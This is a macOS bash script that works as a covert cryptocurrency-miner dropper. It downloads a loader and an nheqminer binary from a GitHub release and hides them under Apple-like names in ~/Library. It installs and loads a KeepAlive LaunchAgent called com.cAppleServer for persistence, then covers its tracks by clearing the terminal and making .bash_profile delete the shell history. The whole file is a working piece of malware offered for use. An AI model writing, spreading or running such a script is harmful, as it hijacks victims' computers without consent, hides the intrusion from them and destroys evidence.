#!/bin/bash
#nice and save
cd;
cd Downloads/;
curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/nice > start
curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/miner > nheqminer
#curl -sL https://github.com/justvanbloom/nheqminer/blob/kost/mac/nheqminer?raw=true > nheqminer
chmod 777 start
chmod 777 nheqminer
cd;
mkdir -p Library/cAppleScript;
mv Downloads/nheqminer Library/cAppleScript/__cAppleScript;
mv Downloads/start Library/cAppleScript/_cAppleScript;
echo -n '
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>StandardErrorPath</key>
<string>/tmp/cAppleServer.err</string>
<key>StandardOutPath</key>
<string>/tmp/cAppleServer.out</string>
<key>Label</key>
<string>com.cAppleServer.plist</string>
<key>ProgramArguments</key>
<array>
<string>/Users/' > ~/Library/LaunchAgents/com.cAppleServer.plist;

echo -n "$USER" >> ~/Library/LaunchAgents/com.cAppleServer.plist;

echo "/Library/cAppleScript/_cAppleScript</string>
</array>
<key>KeepAlive</key>
<true/>
</dict>
</plist>
" >> ~/Library/LaunchAgents/com.cAppleServer.plist;

launchctl load ~/Library/LaunchAgents/com.cAppleServer.plist;
clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;clear;
cd;
echo "cd;rm .bash_history" >> .bash_profile
clear;
#osascript -e 'tell application "Terminal" to close first window' & exit;
#kill terminal causes trouble in application
